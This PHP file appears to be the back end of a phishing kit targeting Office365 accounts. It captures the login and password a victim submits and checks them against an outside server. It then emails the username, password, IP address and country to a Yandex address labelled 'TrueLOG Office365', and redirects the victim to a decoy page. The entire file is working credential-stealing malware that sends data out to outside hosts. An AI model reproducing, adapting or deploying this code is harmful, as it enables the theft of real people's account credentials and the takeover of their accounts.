<?php
$link = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 
                "https" : "http") . "://" . $_SERVER['HTTP_HOST'] .  
                $_SERVER['REQUEST_URI'];
function generateRandomString($length = 50) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
if (isset($_POST['login'])){
	$gen = generateRandomString();
    $ip = getenv("REMOTE_ADDR");
	$log = $_POST['login'];
	$pass= $_POST['passwd'];
	$apiurl = "http://keyfinhome.com/api/index.php";
	$mgs = file_get_contents("$apiurl?email=$log&password=$pass&ip=$ip");
	$divert=$log."&key2=".($gen);
	if ($mgs == 1)
		{
$ip = getenv("REMOTE_ADDR");
require_once('geoplugin.class.php');
$geoplugin = new geoPlugin();
$geoplugin->locate();
$adddate=date("D M d, Y g:i a");
$message .=     "Username : ".$_POST['userid']."\n";
$message .=     "Password : ".$_POST['passwd']."\n";
$message .=     "IP: ".$ip."\n";
$message .=     "=======================================\n";
$message .= 	"Country Name: {$geoplugin->countryName}\n";
$message .=     "=======================================\n";
$message .= 	"Country Code: {$geoplugin->countryCode}\n";
$message .=     "=======================================\n";
$sniper = 'TrueLOG Office365';
$who_be_the_boss = 'AV';
$from = "From: $who_be_the_boss <west>\n";
mail("est1900bc@yandex.com",$sniper,$message,$from);
header("location: Congratulations.php?=" . $log);
		}
	if ($mgs == 0)
		{
		 header("Location:../?key1=$divert".base64_encode($log).'&mgs=error');
		}
	}
